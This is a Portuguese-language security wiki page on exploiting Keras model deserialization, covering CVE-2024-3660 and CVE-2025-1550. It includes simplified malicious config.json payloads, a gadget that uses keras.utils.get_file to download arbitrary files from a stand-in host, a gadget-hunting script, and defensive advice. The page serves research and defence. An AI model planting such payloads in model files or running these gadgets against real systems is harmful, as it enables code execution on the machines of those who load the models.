# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Esta página resume técnicas práticas de exploração contra o pipeline de desserialização de modelos Keras, explica os detalhes internos do formato .keras e a superfície de ataque, e fornece um kit de ferramentas para pesquisadores encontrarem Vulnerabilidades em Arquivos de Modelo (MFVs) e gadgets pós-correção.

## Detalhes internos do formato .keras

Um arquivo .keras é um arquivo ZIP contendo pelo menos:
- metadata.json – informações genéricas (por exemplo, versão do Keras)
- config.json – arquitetura do modelo (superfície de ataque primária)
- model.weights.h5 – pesos em HDF5

O config.json conduz a desserialização recursiva: Keras importa módulos, resolve classes/funções e reconstrói camadas/objetos a partir de dicionários controlados pelo atacante.

Exemplo de trecho para um objeto de camada Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialização realiza:
- Importação de módulo e resolução de símbolos a partir de chaves module/class_name
- invocação de from_config(...) ou do construtor com kwargs controlados pelo atacante
- Recursão em objetos aninhados (ativadores, inicializadores, restrições, etc.)

Historicamente, isso expôs três primitivos a um atacante que cria config.json:
- Controle sobre quais módulos são importados
- Controle sobre quais classes/funções são resolvidas
- Controle sobre kwargs passados para construtores/from_config

## CVE-2024-3660 – RCE de bytecode de camada Lambda

Causa raiz:
- Lambda.from_config() usou python_utils.func_load(...) que decodifica em base64 e chama marshal.loads() em bytes do atacante; a deserialização do Python pode executar código.

Ideia de exploração (payload simplificado em config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigação:
- O Keras aplica safe_mode=True por padrão. Funções Python serializadas no Lambda são bloqueadas, a menos que um usuário opte explicitamente por safe_mode=False.

Notas:
- Formatos legados (saves HDF5 mais antigos) ou bases de código mais antigas podem não aplicar verificações modernas, então ataques do tipo "downgrade" ainda podem ser aplicados quando as vítimas usam carregadores mais antigos.

## CVE-2025-1550 – Importação arbitrária de módulo no Keras ≤ 3.8

Causa raiz:
- _retrieve_class_or_fn usou importlib.import_module() sem restrições com strings de módulo controladas pelo atacante de config.json.
- Impacto: Importação arbitrária de qualquer módulo instalado (ou módulo plantado pelo atacante em sys.path). O código de tempo de importação é executado, então a construção do objeto ocorre com kwargs do atacante.

Ideia de exploração:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Melhorias de segurança (Keras ≥ 3.9):
- Lista de módulos permitidos: importações restritas a módulos do ecossistema oficial: keras, keras_hub, keras_cv, keras_nlp
- Modo seguro padrão: safe_mode=True bloqueia o carregamento de funções serializadas Lambda inseguras
- Verificação de tipo básica: objetos desserializados devem corresponder aos tipos esperados

## Superfície de gadgets pós-correção dentro da lista de permitidos

Mesmo com a lista de permitidos e o modo seguro, uma ampla superfície permanece entre os chamáveis Keras permitidos. Por exemplo, keras.utils.get_file pode baixar URLs arbitrárias para locais selecionáveis pelo usuário.

Gadget via Lambda que referencia uma função permitida (não bytecode Python serializado):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Limitação importante:
- Lambda.call() adiciona o tensor de entrada como o primeiro argumento posicional ao invocar o callable alvo. Gadgets escolhidos devem tolerar um argumento posicional extra (ou aceitar *args/**kwargs). Isso limita quais funções são viáveis.

Impactos potenciais de gadgets permitidos:
- Download/escrita arbitrária (plantio de caminho, envenenamento de configuração)
- Callbacks de rede/efeitos semelhantes ao SSRF dependendo do ambiente
- Encadeamento para execução de código se os caminhos escritos forem posteriormente importados/executados ou adicionados ao PYTHONPATH, ou se existir um local gravável de execução ao escrever

## Conjunto de ferramentas do pesquisador

1) Descoberta sistemática de gadgets em módulos permitidos

Enumere callables candidatos em keras, keras_nlp, keras_cv, keras_hub e priorize aqueles com efeitos colaterais de arquivo/rede/processo/ambiente.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Teste de deserialização direta (nenhum arquivo .keras necessário)

Alimente dicionários elaborados diretamente nos deserializadores do Keras para aprender os parâmetros aceitos e observar os efeitos colaterais.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Probing e formatos entre versões

Keras existe em múltiplas bases de código/eras com diferentes guardrails e formatos:
- Keras embutido no TensorFlow: tensorflow/python/keras (legado, previsto para exclusão)
- tf-keras: mantido separadamente
- Keras 3 multi-backend (oficial): introduziu o .keras nativo

Repita os testes entre bases de código e formatos (.keras vs legado HDF5) para descobrir regressões ou guardas ausentes.

## Recomendações defensivas

- Trate arquivos de modelo como entrada não confiável. Carregue modelos apenas de fontes confiáveis.
- Mantenha o Keras atualizado; use Keras ≥ 3.9 para se beneficiar de listas de permissão e verificações de tipo.
- Não defina safe_mode=False ao carregar modelos, a menos que você confie totalmente no arquivo.
- Considere executar a desserialização em um ambiente isolado, com privilégios mínimos, sem saída de rede e com acesso restrito ao sistema de arquivos.
- Aplique listas de permissão/siglas para fontes de modelos e verificação de integridade sempre que possível.

## Referências

- [Hunting Vulnerabilities in Keras Model Deserialization (blog huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Adicionadas verificações à serialização](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda desserialização RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Importação de módulo arbitrário Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [relatório huntr – importação arbitrária #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [relatório huntr – importação arbitrária #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)

{{#include ../../banners/hacktricks-training.md}}
